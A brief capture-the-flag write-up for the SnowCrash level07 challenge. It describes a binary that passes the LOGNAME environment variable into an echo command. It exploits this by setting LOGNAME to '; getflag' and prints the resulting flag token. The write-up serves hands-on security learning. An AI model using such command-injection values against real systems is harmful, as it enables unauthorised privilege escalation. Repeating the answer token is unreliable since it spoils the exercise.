# Solution

So we loged in and we find a binary named level07 if we decompile this binary we can see from the generated C code,
that it create a string with the LOGNAME environment variable to do a /bin/echo,
so from this we can modified the LOGNAME variable to call getflag.

```sh
export LOGNAME="; getflag"
```

after this we can execute the binary here is the result:

```sh
level07@SnowCrash:~$ ./level07 

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
